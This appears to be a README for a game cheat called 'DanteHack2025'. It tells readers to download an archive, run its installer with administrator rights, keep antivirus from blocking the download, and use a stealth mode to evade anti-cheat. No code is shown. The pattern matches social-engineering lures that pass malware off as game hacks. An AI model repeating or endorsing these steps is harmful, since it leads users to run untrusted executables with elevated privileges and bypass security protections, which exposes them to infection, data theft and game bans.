1. **Prepare Your Environment** 🔍  
   First, ensure your Windows system is up-to-date. Go to Settings > Update & Security and check for 2025 patches. This step is crucial to prevent compatibility issues. Once done, you're ready to proceed! ✅

2. **Access the Download** 📩  
   Click the download button at the top of this README to get started. It's as simple as one click! The link will direct you to the secure source. Remember, always verify the file size (expect around 500MB) to ensure it's the correct download. 🚨

3. **Extract the Files** 📦  
   After downloading, locate the file in your Downloads folder. Right-click and select "Extract All" using Windows' built-in tool. If you don't have it, install 7-Zip from the Microsoft Store for free. Extract to a new folder named "DanteHack2025" on your desktop for easy access. 🗂️

4. **Run the Installer** ⚙️  
   Inside the extracted folder, double-click the installer file (e.g., DanteHackSetup.exe). You'll see a setup wizard—follow the on-screen prompts. It might ask for administrator permissions, so click "Yes" when prompted. This ensures the hack integrates properly with your system files. 🔑

5. **Configure Settings** 🎛️  
   Once installed, launch the hack application. You'll be greeted with a user-friendly interface. Customize options like cheat activation (e.g., enable infinite ammo with a simple toggle). For 2025 Windows builds, make sure to select the "Auto-Detect" mode for seamless game integration. 🌈

6. **Test in Game** 🎮  
   Open your favorite Dante game (e.g., Dante's Inferno Remastered 2025 edition). Activate the hack via the overlay or hotkey (usually F12). Test features like speed hacks or invincibility—watch your gameplay transform! If everything works, you're all set. If not, check the troubleshooting section below. 🛠️

7. **Update Regularly** 🔄  
   In 2025, game updates are frequent, so keep your hack updated. The application might prompt you automatically, or you can redownload from the link. Always back up your game saves before updating to avoid data loss. 📅

### Troubleshooting Common Issues ⚠️
Even with a smooth setup, you might run into problems. Here's how to fix them quickly:
- **Error: "Access Denied"** – Ensure you're running the installer as an administrator. Right-click the file and select "Run as administrator." 🔐
- **Lag or Crashes** – Lower your in-game graphics settings or close background apps. For 2025 Windows, check Task Manager for resource usage. 📊
- **Detection by Anti-Cheat** – If your game flags the hack, try the "Stealth Mode" option in the settings. Always use on single-player modes to stay safe. 🚫
- **Download Fails** – If the link doesn't work, clear your browser cache and try again. Ensure your antivirus isn't blocking it. 🔗

If these don't help, reach out via GitHub issues—but remember, we're not responsible for any game bans or system damages. Play smart! 🤖
